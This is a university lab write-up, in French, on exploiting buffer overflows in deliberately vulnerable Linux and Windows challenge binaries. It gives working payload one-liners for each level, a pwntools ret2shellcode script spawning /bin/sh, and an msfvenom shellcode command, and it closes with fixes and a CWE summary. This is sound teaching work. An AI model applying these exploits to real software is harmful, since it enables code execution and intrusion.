# Labo 1 : exploitation de buffer overflow (Linux et Windows)

Exploitation binaire pratique sur des programmes de défi volontairement vulnérables, réalisée dans un labo universitaire de sécurité logicielle (ÉTS, Montréal, hiver 2026). Les défis tournent sur une VM Kali Linux (niveaux numérotés) et une VM Windows 7 (deux applications Win32). On monte en difficulté : de l'écrasement d'une variable locale, au détournement d'une adresse de retour, jusqu'à l'injection et l'exécution de shellcode.

Labo réalisé en équipe de 4, write-up et reformulation par Ilyas El Houdaigui. Aucun nom ni matricule des coéquipiers n'est inclus. Les flags de défi (`LOG460{...}`) sont gardés comme preuve de réussite ; ils appartiennent à cette instance de labo et n'ont aucune valeur ailleurs.

English version: [README.md](README.md).

Chaque niveau suit la même forme : le C vulnérable, l'agencement de la pile ou du tas vu dans GDB, la charge utile, et le résultat.

Sommaire :

- Linux : [Level 01](#level-01-écrasement-de-variables-locales), [Level 02](#level-02-écrasement-de-uid-à-0), [Level 03](#level-03-écrasement-de-la-commande-passée-à-system), [Level 04](#level-04-écrasement-dun-pointeur-de-fonction-dans-bss), [Level 05](#level-05-ret2win-x64), [Level 06](#level-06-ret2win-avec-arguments-x86), [Level 07](#level-07-ret2shellcode-avec-brute-force-aslr), [Level 16](#level-16-heap-overflow)
- Windows : [Ret2Win](#windows-ret2win), [Ret2Shell](#windows-ret2shell)
- [Outils](#outils), [Correctifs](#correctifs), [Récapitulatif des vulnérabilités (CWE)](#récapitulatif-des-vulnérabilités-cwe)

La méthode partout : lire le C pour trouver l'appel non sûr, utiliser GDB (GEF) pour repérer où est le buffer par rapport à la cible (une variable, l'adresse de retour sauvegardée, ou un pointeur de fonction), calculer la distance, et construire une charge utile en little-endian qui comble l'écart et écrit la valeur voulue.

---

## Linux

### Level 01: écrasement de variables locales

Le programme lit l'entrée avec `read(STDIN_FILENO, buff, BUFF_SIZE + 16)` dans un buffer sur la pile. Les 16 octets en trop suffisent à atteindre deux variables locales vérifiées plus loin par XOR pour décider d'afficher le flag. C'est un débordement de tampon sur la pile (CWE-121).

Dans GDB, `lea eax, [ebp-0x298]` avant l'appel à `read` place le buffer à `ebp-0x298`. Les deux variables vérifiées sont à `ebp-0x10` et `ebp-0xc`, donc la distance du buffer à la première cible est `0x298 - 0x10 = 648` octets. Les instructions de comparaison donnent les valeurs attendues : `ebp-0x10` doit valoir `0x359932d1` et `ebp-0xc` doit valoir `0x2159ad55`.

![GDB : le buffer à ebp-0x298 et les valeurs XOR attendues](img/level01-stack-analysis.png)

Charge utile : 648 octets de remplissage, puis les deux valeurs en little-endian.

```
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*648 + b"\xd1\x32\x99\x35" + b"\x55\xad\x59\x21")' | ./level01
```

### Level 02: écrasement de uid à 0

`fgets(name, BUFF_SIZE + 16, stdin)` autorise 16 octets après le buffer `name`, assez pour écraser une variable locale `uid`. L'option 3 du menu n'affiche le flag que si `uid == 0`.

Le buffer est à `ebp-0x14c` et `uid` à `ebp-0xc`, donc la distance est `0x14c - 0xc = 320` octets. On remplit 320 octets, on écrit quatre octets nuls sur `uid`, on termine la ligne pour que `fgets` rende la main, puis on envoie `3` au menu.

```
(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*320 + b"\x00\x00\x00\x00" + b"\n")'; echo "3") | ./level02
```

### Level 03: écrasement de la commande passée à system

`fgets(choice, BUFF_SIZE * 2, stdin)` déborde de `choice` vers `cmd`, et le programme exécute ensuite `system(cmd)` quand `choice` commence par `yes`. L'entrée doit donc à la fois passer la vérification `yes` et réécrire `cmd`.

Dans le désassemblage, `cmd` est à `ebp-0x5d8` (initialisé à `/usr/bin/date`) et `choice` à `ebp-0xba8`, donc la distance est `0xba8 - 0x5d8 = 1488` octets. L'entrée commence par `yes` (3 octets), remplit les 1485 octets restants, puis écrase `cmd` avec la commande à exécuter.

```
python3 -c 'print("yes" + "A"*1485 + "cat flag.txt\x00")' | ./level03
```

`system` exécute alors `cat flag.txt` et le flag revient : `LOG460{WyJhZ2l0YXRlZC1zYW5kZXZpb24iLCJsZXZlbDAzIiwieDg2Il0.5Hm6Y9AtctAdSdwqc6HotwLW63c}`.

![Level 03 résolu : table des protections et flag](img/level03-flag.png)

### Level 04: écrasement d'un pointeur de fonction dans .bss

`gets(global_buff)` est non borné, et il y a un pointeur de fonction global `void (*function)(void)` dans le `.bss` qui est appelé plus loin. L'écraser redirige l'exécution. Cela montre que les débordements ne sont pas seulement un problème de pile.

`gets` écrit à `ebx+0x8c` et le pointeur est lu depuis `ebx+0x78c`, donc la distance est `0x78c - 0x8c = 0x700 = 1792` octets. La cible est `get_flag`, trouvée avec `p get_flag` à `0x804882a`.

```
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*1792 + b"\x2a\x88\x04\x08\n")' | ./level04
```

### Level 05: ret2win (x64)

`gets(buff)` déborde la pile jusqu'à l'adresse de retour sauvegardée. Le but est de rediriger l'exécution vers une fonction `win()` qui lit le flag.

`sub rsp, 0x90` réserve 144 octets et le buffer est à `rbp-0x90`. Après le buffer et le RBP sauvegardé de 8 octets, l'adresse de retour est à l'offset 152. `win` est à `0x400b28` (`p win`).

```
python3 -c "import sys; sys.stdout.buffer.write(b'A'*152 + b'\x28\x0b\x40\x00\x00\x00\x00\x00')" | ./level05
```

![Level 05 résolu : le ret2win x64 atteint win() et affiche le flag](img/level05-ret2win-flag.png)

### Level 06: ret2win avec arguments (x86)

Ici `win(a, b)` n'affiche le flag que si `a == 0xdeadbeef` et `b == 0xbadf00d`. En cdecl 32 bits, les arguments se lisent sur la pile, donc la charge utile reconstruit une fausse trame d'appel après l'adresse de retour.

Le buffer est à `ebp-0x438` (1080 octets), plus 4 pour le EBP sauvegardé donne 1084 pour atteindre EIP. `win` est à `0x08048838`. Après l'adresse de retour vient une fausse adresse de retour (du junk, là où `win` retournerait) puis les deux arguments.

```
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*1084 + b"\x38\x88\x04\x08" + b"JUNK" + b"\xef\xbe\xad\xde" + b"\x0d\xf0\xad\x0b")' | ./level06
```

### Level 07: ret2shellcode avec brute force ASLR

`gets(buff)` encore, mais il n'y a pas de fonction `win` cachée, donc l'exploit injecte son propre shellcode. Le programme fuit l'adresse du buffer avec `printf("buff @ %p\n", buff)`, ce qui compte parce que l'ASLR est actif et que l'adresse change à chaque exécution.

Le buffer est à `ebp-0x568` (1384 octets), plus 4 pour le EBP sauvegardé donne un offset de 1388 octets vers l'adresse de retour. Comme l'adresse fuitée varie, l'exploit tourne en boucle avec pwntools : lire la fuite, construire un NOP sled plus le shellcode `/bin/sh`, remplir jusqu'à 1388, et mettre l'adresse de retour à la fuite plus un décalage pour atterrir dans le sled.

```python
from pwn import *
context.arch = 'i386'
while True:
    p = process('./level07')
    p.recvuntil(b'buff @ ')
    addr = int(p.recvline().strip(), 16)
    nops = b"\x90" * 512
    shell = asm(shellcraft.sh())
    padding = b"A" * (1388 - len(nops) - len(shell))
    payload = nops + shell + padding + p32(addr + 256)
    p.sendline(payload)
    p.sendline(b"cat /challenges/level07/x86/flag.txt")
    res = p.recvall(timeout=0.5).decode(errors='ignore')
    if "LOG460" in res:
        print(res); break
    p.close()
```

Ça a réussi au premier essai et a renvoyé le flag.

![Level 07 résolu : le ret2shellcode en brute force affiche le flag](img/level07-ret2shellcode-flag.png)

### Level 16: heap overflow

Celui-ci est un débordement sur le tas (CWE-122). Le programme fait un `malloc` pour un buffer `username` (16 octets) et une struct `User` (`id`, pointeur `username`), puis appelle `gets(user->username)` sans borne. La vérification `if (!user->id)` donne les droits admin, donc le but est de déborder hors du chunk `username` de 16 octets et d'écrire zéro sur le `user->id` adjacent.

Après avoir trouvé la distance entre les deux chunks avec des breakpoints à `main+4` et `gets@plt`, 32 octets de remplissage atteignent `user->id`, qui est ensuite mis à zéro.

```
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*32 + b"\x00\x00\x00\x00\n")' ; cat | ./level16
```

Le programme répond `Welcome back admin`, et `cat flag.txt` renvoie le flag.

![Level 16 résolu : l'écrasement sur le tas donne les droits admin et révèle le flag](img/level16-heap-flag.png)

---

## Windows

Le volet Windows est une build Win32 sur Windows 7, pilotée avec x32dbg / Immunity Debugger.

### Windows Ret2Win

`ret2win.c` lit avec `gets(buff)` dans un buffer de 32 octets, et une fonction `win()` exécute `calc.exe`. Le débordement écrase l'adresse de retour sauvegardée (EIP). En soustrayant l'adresse du buffer à l'emplacement du EIP sauvegardé, on obtient un offset de 44 octets (buffer plus EBP sauvegardé plus alignement). `win` est à `0x004015C0`.

```
python -c "print('A'*44 + '\xC0\x15\x40\x00')" | ret2win.exe
```

Le retour atterrit dans `win`, et `calc.exe` se lance.

![Windows Ret2Win : le débordement redirige vers win() et calc.exe s'ouvre](img/windows-ret2win-calc.png)

### Windows Ret2Shell

`ret2shell` lit avec `scanf("%s", buff)` dans un buffer de 512 octets, sans contrôle de longueur, donc plus de 512 octets écrasent la pile. En le faisant planter exprès et en lisant les registres, on obtient l'offset vers l'adresse de retour sauvegardée (116 octets ici) et l'emplacement du buffer.

Pour une redirection ret2win, l'offset est 44 et `win` est à `0x00401050`. Pour la voie shellcode, le shellcode vient de msfvenom :

```
msfvenom -p windows/exec CMD=calc.exe -a x86 -f hex
```

La charge utile finale est 116 octets de remplissage, une adresse de retour qui pointe dans le buffer, un court NOP sled, puis le shellcode :

```
'41' * 116 + 'af115062' + '90' * 20 + <shellcode msfvenom>
```

---

## Outils

- GDB avec GEF pour l'analyse statique et dynamique sous Linux (agencement de la pile, `p <symbole>` pour les adresses).
- pwntools pour le ret2shellcode scripté avec la fuite d'adresse et le brute force.
- msfvenom pour le shellcode Windows.
- x32dbg et Immunity Debugger pour les binaires Windows.

## Correctifs

Chacun de ces bugs vient d'une écriture non sûre sans contrôle de borne, et la plupart d'une fonction d'entrée dangereuse. Le volet défensif est concret :

- Ne jamais utiliser `gets` ; elle ne peut pas être utilisée sans risque (CWE-242). Utiliser `fgets` avec la vraie taille du buffer, et s'assurer que les tailles de `read`/`fgets` correspondent à l'allocation au lieu de la dépasser (les levels 01, 02, 03 passent une taille plus grande que le buffer).
- Traiter `scanf("%s", ...)` de la même façon ; le borner avec une largeur de champ.
- Valider les indices et les longueurs avant d'écrire, sur le tas comme sur la pile.
- Activer les protections du compilateur et du loader que ces défis ont volontairement désactivées : canaris de pile (SSP), DEP/NX, ASLR, PIE, FORTIFY_SOURCE et RELRO complet. Les tables de protections dans les captures montrent lesquelles étaient désactivées pour rendre chaque exploit possible, ce qui rappelle bien ce qu'apporte chacune.

## Récapitulatif des vulnérabilités (CWE)

| Défi | Bug | CWE |
|------|-----|-----|
| Levels 01, 02, 03, 05, 06, 07 | Débordement de tampon sur la pile | CWE-121 |
| Level 04 | Débordement écrasant un pointeur de fonction | CWE-787 / CWE-121 |
| Level 16 | Débordement de tampon sur le tas | CWE-122 |
| Windows Ret2Win, Ret2Shell | Débordement de tampon sur la pile | CWE-121 |
| Usage de gets / scanf non borné | Usage d'une fonction dangereuse | CWE-242 |
| Tous | Écriture hors limites | CWE-787 |

## Note sur le périmètre et l'éthique

C'étaient des exploits autorisés contre des binaires volontairement vulnérables sur des VM de labo locales. Rien ici n'a été exécuté contre un système que je ne possède pas. Les flags montrés sont des marqueurs propres à l'instance de labo, sans valeur hors de l'exercice.
